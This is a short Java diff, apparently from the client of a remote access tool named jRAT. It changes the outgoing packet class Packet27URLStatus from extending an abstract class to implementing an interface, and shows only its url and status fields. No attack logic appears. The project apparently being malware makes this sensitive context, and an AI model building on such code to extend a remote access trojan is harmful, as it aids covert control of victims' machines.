@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 
 
-public class Packet27URLStatus extends AbstractOutgoingPacket {
+public class Packet27URLStatus implements OutgoingPacket {
 
 	private String url;
 	private String status;
